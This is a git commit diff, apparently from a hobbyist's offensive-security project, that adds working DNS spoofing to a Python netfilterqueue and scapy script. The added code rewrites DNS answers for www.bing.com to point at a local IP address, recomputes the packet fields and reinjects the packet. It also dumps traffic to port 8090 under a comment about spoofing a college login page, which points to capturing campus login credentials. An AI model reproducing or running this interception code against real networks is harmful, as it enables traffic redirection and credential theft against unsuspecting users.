9c49350491df2a3d374c332ea27cf7c7a8249923
Aditya <vaditya06@gmail.com>
2024-03-13 07:50:49 -0400

    Successfully altered a packet and completed DNS spoofing

--- DNS SPoofer/DNS_Spoofer.py
+++ DNS SPoofer/DNS_Spoofer.py
@@ -5,10 +5,36 @@
 import netfilterqueue as net
 import scapy.all as scapy
 
+def process_college_packet(packet):
+    print(packet.show())
 def process_packet(packet):
     # Converting packet into scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
-    print(packet.get_payload()) # Shows the contents inside the packet itself
+
+    # For college login page spoofing
+    if scapy_packet.haslayer(scapy.TCP):
+        if scapy_packet[scapy.TCP].dport == 8090:
+            process_college_packet(scapy_packet)
+
+    # DNS response spoofing
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in str(qname):
+            print(f"[+] Spoofing {qname}")
+            # print(scapy_packet.show())
+            ans = scapy.DNSRR(rrname=qname, rdata="192.168.146.129")
+            scapy_packet[scapy.DNS].an = ans
+            scapy_packet[scapy.DNS].ancount = 1
+
+            # Deleting the fields
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            # Setting the payload of the packet to the scapy packet
+            packet.set_payload(bytes(scapy_packet)) # Since by default the payload data is in string format
+
     packet.accept() # Accepts all packets
 
 queue = net.NetfilterQueue()
